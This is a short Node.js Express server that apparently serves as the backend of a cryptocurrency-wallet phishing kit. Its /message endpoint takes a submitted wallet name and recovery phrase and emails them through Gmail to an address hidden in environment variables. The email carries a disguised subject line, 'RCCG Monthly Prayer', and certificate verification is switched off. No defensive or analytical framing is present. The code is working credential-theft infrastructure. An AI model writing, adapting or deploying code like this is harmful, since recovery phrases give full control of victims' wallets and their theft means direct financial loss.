const express = require("express");
const app = express();
const PORT = process.env.PORT || 2000;
const path = require("path");
require("dotenv").config();
var nodemailer = require("nodemailer");

app.use(express.json());

app.post("/message", (req, res) => {
  //    console.log(req)
  const input = `
    <p> You have a messgae</p>
    <h3> Contact Details</h3>
    <ul>
    <li>Wallet: ${req.body.wallet}</li>
    <li>Recovery Phrase: ${req.body.rPhrase}</li>
    </ul>
    `;

  let transport = nodemailer.createTransport({
    service: "gmail",
    secure: false,
    auth: {
      user: process.env.FROM_USER,
      pass: process.env.FROM_PASS,
    },
    tls: {
      rejectUnauthorized: false,
    },
  });

  var mailOptions = {
    from: `${process.env.FROM_NAME}<${process.env.FROM_EMAIL}>`,
    to: process.env.TO_USER,
    subject: "RCCG Monthly Prayer",
    html: input,
  };

  transport.sendMail(mailOptions, (err, info) => {
    if (err) {
      res.json({ status: 500, msg: "Email not sent" });
      console.log(err);
    } else {
      res.status(200).json(info.data);
    }
  });
});

app.listen(PORT, () => console.log(`Server started on Port ${PORT}`));
